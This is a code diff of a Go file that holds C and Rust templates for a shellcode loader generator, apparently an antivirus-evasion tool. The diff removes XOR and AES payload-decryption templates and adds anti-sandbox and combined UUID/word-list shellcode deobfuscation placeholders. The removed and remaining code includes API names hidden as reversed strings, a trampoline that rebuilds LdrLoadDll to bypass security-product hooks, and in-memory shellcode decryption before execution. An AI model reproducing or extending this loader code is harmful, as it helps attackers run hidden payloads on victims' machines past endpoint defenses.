@@ -102,8 +102,8 @@ var __c__words = `
 
 `
 
-// c xor 模板
-var __c__syscall__xor = `
+// c syscall 模板
+var __c__syscall = `
 #include <Windows.h>
 #include <stdio.h>
 #include <stdbool.h>
@@ -111,16 +111,6 @@ REPLACE_STSYSCALL_Framework
 #include <Rpc.h>
 
 typedef VOID(NTAPI* myNtTestAlert)(VOID);
-
-void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
-    int j;
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-        if (j == key_len - 1) j = 0;
-        data[i] = data[i] ^ key[j];
-        j++;
-    }
-}
 
 bool isPrime(long long n1) {
 	if (n1 <= 1)
@@ -139,7 +129,6 @@ int main() {
 	REPLACR_OBFUSCATION
     unsigned char key[] = "%s";
     unsigned int key_len = sizeof(key);
-    My_Xor((char*)xpp, length, (char*)key, key_len);
 
 	SIZE_T allocationSize = length;
 	void* addr = NULL;
@@ -149,56 +138,6 @@ int main() {
     return 0;
 }
 
-`
-
-// c aes 模板
-var __c__syscall__aes = `
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <Windows.h>
-#include <lmcons.h>
-#include <lm.h>
-#include "aes.h"
-REPLACE_STSYSCALL_Framework
-
-typedef VOID(NTAPI* myNtTestAlert)(VOID);
-
-bool isPrime(long long n1) {
-	if (n1 <= 1)
-		return false;
-	
-	for (long long i = 2; i * i <= n1; ++i) {
-		if (n1 %% i == 0)
-			return false;
-	}
-	
-	return true;
-}
-int main() {
-
-	REPLACE_ANTI_SANDBOX
-
-	REPLACR_OBFUSCATION
-    uint8_t Key[] = "%s";
-    uint8_t IV[] = "%s";
-    struct AES_ctx ctx;
-
-    init(&ctx, Key, IV);
-    de_buffer(&ctx, (uint8_t *)xpp, length);
-
-	void* addr = NULL;
-	SIZE_T allocationSize = length;
-
-	REPLACE_Loading_Technique
-
-    free(xpp);
-
-    return 0;
-}
 `
 
 // unhook模板
@@ -298,302 +237,8 @@ var __c__unhook__fiber = `
     MySwitchToFiber(shellcodeFiber);
 `
 
-// unhook_aes
-var __c__unhook__aes = `
-#include <Windows.h>
-#include "aes.h"
-#include <stdio.h>
-#include <tlhelp32.h>
-
-
-#define OBJ_CASE_INSENSITIVE 0x00000040L
-
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
-
-
-typedef struct _OBJECT_ATTRIBUTES {
-    ULONG           Length;
-    HANDLE          RootDirectory;
-    PUNICODE_STRING ObjectName;
-    ULONG           Attributes;
-    PVOID           SecurityDescriptor;
-    PVOID           SecurityQualityOfService;
-} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
-
-#define InitializeObjectAttributes( i, o, a, r, s ) {    \
-      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
-      (i)->RootDirectory = r;                            \
-      (i)->Attributes = a;                               \
-      (i)->ObjectName = o;                               \
-      (i)->SecurityDescriptor = s;                       \
-      (i)->SecurityQualityOfService = NULL;              \
-   }
-
-typedef NTSTATUS(NTAPI* pNewLdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
-typedef int(WINAPI* pMessageBoxW)(
-        _In_opt_ HWND hWnd,
-        _In_opt_ LPCWSTR lpText,
-        _In_opt_ LPCWSTR lpCaption,
-        _In_ UINT uType
-);
-PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)
-{
-    PBYTE D = (PBYTE)Destination;
-    PBYTE S = (PBYTE)Source;
-
-    while (Length--)
-        *D++ = *S++;
-
-    return Destination;
-}
-
-SIZE_T StringLengthW(LPCWSTR String)
-{
-    LPCWSTR String2;
-
-    for (String2 = String; *String2; ++String2);
-
-    return (String2 - String);
-}
-
-VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
-{
-    SIZE_T DestSize;
-
-    if (SourceString)
-    {
-        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
-        DestinationString->Length = (USHORT)DestSize;
-        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
-    }
-    else
-    {
-        DestinationString->Length = 0;
-        DestinationString->MaximumLength = 0;
-    }
-
-    DestinationString->Buffer = (PWCHAR)SourceString;
-}
-
-_Bool isPrime(long long n) {
-    if (n <= 1) {
-        return 0;
-    }
-
-    for (long long i = 2; i * i <= n; ++i) {
-        if (n %% i == 0) {
-            return 0;
-        }
-    }
-
-    return 1;
-}
-
-void reverseString(char* str) {
-    int left = 0;
-    int right = strlen(str) - 1;
-    char temp;
-
-    while (left < right) {
-        // 交换两个字符
-        temp = str[left];
-        str[left] = str[right];
-        str[right] = temp;
-
-        // 移动指针
-        left++;
-        right--;
-    }
-}
-
-void reverseWcharString(wchar_t* str) {
-    int left = 0;
-    int right = wcslen(str) - 1;
-
-    while (left < right) {
-        // 交换两个宽字符
-        wchar_t temp = str[left];
-        str[left] = str[right];
-        str[right] = temp;
-
-        // 移动指针
-        left++;
-        right--;
-    }
-}
-
-
-int main()
-{
- 	pNewLdrLoadDll LdrLoadrDll;
-    UNICODE_STRING user32dll;
-    UNICODE_STRING kernel32dll;
-    UNICODE_STRING ntdlldll;
-
-    OBJECT_ATTRIBUTES objectAttributes_user32 = { 0 };
-    OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
-    OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };
-
-    wchar_t user32_dll[] = { L'l', L'l', L'd', L'.', L'3', L'2', L'e', L's', L'U', L'\0' };
-    wchar_t kernel32_dll[]={ L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0' }  ;
-    wchar_t ntdll_dll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0' };
-    reverseWcharString(user32_dll);
-    reverseWcharString(kernel32_dll);
-    reverseWcharString(ntdll_dll);
-
-    char ldr_load_dll[] = { L'l', L'l', L'D', L'd', L'a', L'o', L'L', L'r', L'd', L'L', L'\0'};
-    char ntdll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0'};
-    char kernel32[] = { L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0'};
-    reverseString(ldr_load_dll);
-    reverseString(ntdll);
-    reverseString(kernel32);
-
-
-    //Obtaining LdrLoadDll Address from loaded NTDLL
-    RtlInitUnicodeString(&user32dll, user32_dll);
-    RtlInitUnicodeString(&kernel32dll, kernel32_dll);
-    RtlInitUnicodeString(&ntdlldll, ntdll_dll);
-
-
-    InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    char get_module_handle_a[] = { 'A', 'e', 'l', 'd', 'n', 'a', 'H', 'e', 'l', 'u', 'd', 'o', 'M', 't', 'e', 'G', '\0' };
-    reverseString(get_module_handle_a);
-    typedef HMODULE(WINAPI* pGetModuleHandleA1)(
-            LPCSTR lpModuleName
-    );
-
-    pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
-    char get_proc_address[] = { 's', 's', 'e', 'r', 'd', 'd', 'A', 'c', 'o', 'r', 'P', 't', 'e', 'G', '\0'  };
-    reverseString(get_proc_address);
-    typedef FARPROC(WINAPI* pGetProcAddress)(
-            HMODULE hModule,
-            LPCSTR lpProcName
-    );
-    pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
-    char virtual_alloc[] = { 'c', 'o', 'l', 'l', 'A', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0' };
-    reverseString(virtual_alloc);
-    typedef LPVOID(WINAPI* pVirtualAlloc)(
-            LPVOID lpAddress,
-            SIZE_T dwSize,
-            DWORD flAllocationType,
-            DWORD flProtect
-    );
-
-    pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
-    char virtual_protect[] = { 't', 'c', 'e', 't', 'o', 'r', 'P', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0'};
-    reverseString(virtual_protect);
-    typedef BOOL(WINAPI* pVirtualProtect)(
-            LPVOID lpAddress,
-            SIZE_T dwSize,
-            DWORD flNewProtect,
-            PDWORD lpflOldProtect
-    );
-    pVirtualProtect MyVirtualProtect1 = (pVirtualProtect)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32),(LPCSTR)virtual_protect);
-
-    FARPROC  origLdrLoadDll = MyGetProcAddress1(GetModuleHandleA(ntdll), (LPCSTR)ldr_load_dll);
-#ifdef _WIN64
-    //Setting up the structure of the trampoline for the instructions
-    unsigned char jumpPrelude[] = { 0x49, 0xBB };
-    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
-    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
-    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
-    *(void**)(jumpAddress) = jmpAddr;
-    LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    // mov qword ptr[rsp + 10h]  原始的LdrLoadDll中汇编，使用我们自己的防止被hook
-    // mov r11,address
-    // jmp rll
-    // ret
-    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5c\x24\x10", 5);
-    //Setting up the JMP address in the original LdrLoadDll
-    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
-    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
-    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);
-    DWORD oldProtect1 = 0;
-    MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
-    LdrLoadrDll = (pNewLdrLoadDll)trampoline;
-
-    #else
-    //  x86 架构下的代码
-	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-
-	LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x2);
-
-	unsigned char jumpPrelude[] = { 0xB8 };
-	unsigned char jumpAddress[] = { 0x65, 0x72, 0x45, 0x77 };
-	unsigned char jumpEpilogue[] = { 0xFF, 0xE0, 0xC3 };
-	*(void**)(jumpAddress) = jmpAddr;
-
-	CCopyMemory(trampoline, (PVOID)"\x89\xFF", 2);
-	CCopyMemory((PBYTE)trampoline + 2, jumpPrelude, sizeof jumpPrelude);
-	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude, jumpAddress, sizeof jumpAddress);
-	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude + sizeof jumpAddress, jumpEpilogue, sizeof jumpEpilogue);
-	DWORD oldProtect1 = 0;
-	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
-	LdrLoadrDll = (pNewLdrLoadDll)trampoline;
-
-
-#endif
-    ;
-    //Loading dll
-    HANDLE User32module = NULL;
-    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
-    HANDLE kernel32module = NULL;
-    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
-    HANDLE ntdllmodule = NULL;
-    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
-    typedef HMODULE(WINAPI* pGetModuleHandleA)(
-            LPCSTR lpModuleName
-    );
-    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);
-
-    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);
-
-    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);
-
-
-    char write_process_memory[] = { 'y', 'r', 'o', 'm', 'e', 'M', 's', 's', 'e', 'c', 'o', 'r', 'P', 'e', 't', 'i', 'r', 'W', '\0'};
-    reverseString(write_process_memory);
-    typedef BOOL(WINAPI* pWriteProcessMemory)(
-            HANDLE hProcess,
-            LPVOID lpBaseAddress,
-            LPCVOID lpBuffer,
-            SIZE_T nSize,
-            SIZE_T* lpNumberOfBytesWritten
-    );
-
-    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
-    
-    char get_current_process[] = { 's', 's', 'e', 'c', 'o', 'r', 'P', 't', 'n', 'e', 'r', 'r', 'u', 'C', 't', 'e', 'G', '\0' };
-    reverseString(get_current_process);
-    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
-    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);
-
-	REPLACR_OBFUSCATION
-
-    uint8_t Key[] = "%s";
-    uint8_t IV[] = "%s";
-	struct AES_ctx ctx;
-
-    init(&ctx, Key, IV);
-    de_buffer(&ctx, (uint8_t *)xpp, length);
-
-    SIZE_T allocationSize = length;
-    void* addr = NULL;
-
-	REPLACE_Loading_Technique
-
-    return 0;
-}
-`
-
 // unhook_xor
-var __c__unhook__xor = `
+var __c__unhook = `
 #include <Windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
@@ -719,18 +364,9 @@ void reverseWcharString(wchar_t* str) {
     }
 }
 
-void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
-    int j;
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-        if (j == key_len - 1) j = 0;
-        data[i] = data[i] ^ key[j];
-        j++;
-    }
-}
-
 int main()
 {
+	REPLACE_ANTI_SANDBOX
     pNewLdrLoadDll LdrLoadrDll;
     UNICODE_STRING user32dll;
     UNICODE_STRING kernel32dll;
@@ -878,9 +514,6 @@ int main()
 
 	REPLACR_OBFUSCATION
 
-	unsigned char key[] = "%s";
-    unsigned int key_len = sizeof(key);
-    My_Xor((char*)xpp, length, (char*)key, key_len);
 
 	SIZE_T allocationSize = length;
 	void* addr = NULL;
@@ -909,33 +542,26 @@ var __rust__sandbox = `
 // rust 解混淆
 var __rust__uuid = `
 	let uuids: Vec<&str> = vec![ %s ];
-	let mut shellcode_result = deobfuscate_uuid(uuids);
-	let mut shellcode = match shellcode_result {
+	let mut shellcode_uuid_result = deobfuscate_uuid(uuids);
+	let mut shellcode_uuid = match shellcode_uuid_result {
 	   Ok(bytes) => bytes,
 	   Err(_) => {
 		   println!("Failed to deobfuscate UUIDs");
 		   return;
 	   }
 	};
+	let dataset:Vec<&str>=vec![ %s ];
+	let words:Vec<&str>=vec![ %s ];
+	let mut shellcode_rust = deobfuscate_words(words,dataset);
+	//拼接shellcode
+    let mut shellcode = shellcode_uuid;
+    shellcode.extend(shellcode_rust);
 `
 
 var __rust__words = `
 	let dataset:Vec<&str>=vec![ %s ];
 	let words:Vec<&str>=vec![ %s ];
 	let mut shellcode=deobfuscate_words(words,dataset);
-`
-
-// rust 解密
-var __rust__aes = `
-	let key = b"%s";
-	let iv = b"%s";
-	let cipher = Cipher::new_128(key);
-
-	let shellcode = cipher.cbc_decrypt(iv, &*shellcode);
-`
-var __rust__xor = `
-	let key = b"%s";
-	my_xor(&mut shellcode, key);
 `
 
 // rust加载方式模板
@@ -1062,7 +688,6 @@ use std::{mem, ptr, slice};
 use std::alloc::{alloc, dealloc, Layout};
 use std::ptr::{null, null_mut};
 use uuid::Uuid;
-use libaes::Cipher;
 
 use winapi::shared::minwindef::{LPCVOID, LPVOID};
 use winapi::shared::ntdef::{LCID, LOCALE_USER_DEFAULT, NTSTATUS, NULL, PULONG, PUNICODE_STRING, PVOID, UNICODE_STRING, WCHAR};
@@ -1138,12 +763,6 @@ fn deobfuscate_words(words: Vec<&str>, dataset: Vec<&str>) -> Vec<u8> {
         }
     }
     shellcode
-}
-
-fn my_xor(data: &mut [u8], key: &[u8]) {
-    for i in 0..data.len() {
-        data[i] ^= key[i %% key.len()];
-    }
 }
 
 fn is_prime(n: i64) -> bool {
@@ -1269,8 +888,6 @@ fn main() {
         let my_get_current_process: PMyGetCurrentProcess = transmute(my_get_current_process_addr);
 
 		REPLACR_OBFUSCATION
-
-		REPLACR_DECRYPT
 
 		REPLACE_Loading_Technique
     };
